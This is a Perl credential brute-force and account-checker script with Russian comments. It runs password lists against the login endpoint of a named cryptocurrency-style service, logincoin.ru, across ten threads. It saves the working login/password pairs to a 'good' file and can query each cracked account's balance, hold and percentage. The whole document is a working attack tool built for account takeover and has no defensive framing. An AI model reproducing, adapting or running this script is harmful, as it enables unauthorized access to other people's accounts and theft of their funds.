#!/usr/bin/env perl
our $VERSION = 0.1;

########################
# Брутфорс давно умер #
########################

use strict;
use warnings;
use feature qw/say switch unicode_strings/;

use threads;
use threads::shared;

use LWP::Simple;
use Fcntl ':flock';
use Digest::MD5 qw(md5_hex);

$| = 1;

##########################Config##################################
my $logins = 'logins.txt';  # Файл с логинами
my $pass = 'pass.txt';      # Файл с паролями
my $split = ';';            # Разделитель
my $threads = 10;           # Кол-во потоков
my $good = 'good.txt';      # Файл с гудами
my $bad =  undef;           # Файл с бэдами
my $balans = 1;             # Проверять баланс 1 - да, 0 - нет
#################################################################

print "[i] Read logins and pass ...\n";

open (ACCS, $logins) or die "Cen't open file ".$logins." [ ".$!." ]\n";
chomp(my @logins : shared  = <ACCS>);
close(ACCS);
print "[+] Logins loaded.\n";

open (ACCS, $pass) or die "Cen't open file ".$pass." [ ".$!." ]\n";
chomp(my @pass = <ACCS>);
close(ACCS);
print "[+] Passwords loaded.\n";

print "[i] Starting threads ...\n";
threads->new(\&main) for 1 .. $threads;
$_->join for threads->list;
print "[i] Process finished.\n";

sub main {
    while (my $login = shift @logins) {
        for (@pass) {
            my $sesion = login($login, $_);

            if ($sesion) {
                if ($balans) {
                    my @inf = get_balans($sesion);
                    print '[Good] ['.$login.$split.$_.'] [Balans: '.$inf[1].'| Hold: '.$inf[2].'| Procent: '.$inf[3].']'."\n";
                    wf($good, $login.$split.$_.' [Balans: '.$inf[1].'| Hold: '.$inf[2].'| Procent: '.$inf[3].']'."\n");
                } else {
                    print '[Good] ['.$login.$split.$_."]\n";
                    wf($good, $login.$split.$_."\n");
                }
            } else {
                print '[Bad]  ['.$login.$split.$_."]\n";
                wf($bad, $login.$split.$_."\n") if ($bad);
            }
        }
    }
}

sub login {
    my ($login, $pass) = @_;
    chomp($login, $pass);
    my $result = get('http://logincoin.ru/auth/?login='.$login.'&pass='.md5_hex($pass));
    if ($result) {
        if ($result !~ m#error#i) {
            chomp($result);
        } else {
            $result = undef;
        }
    } else {
        $result = undef;
    }
    return $result;
}

sub wf
{
    open my $dat, '>>', $_[0] or die "\nCould not open $_[0] file!\n";
    flock $dat, LOCK_EX;
    print $dat $_[1];
    flock $dat, LOCK_UN;
    close $dat;
}

sub get_balans {
    my $sesion = shift;
    my $data = get('http://logincoin.ru/user/?sid='.$sesion);
    my @inf = split /:/, $data;
    return @inf;
}
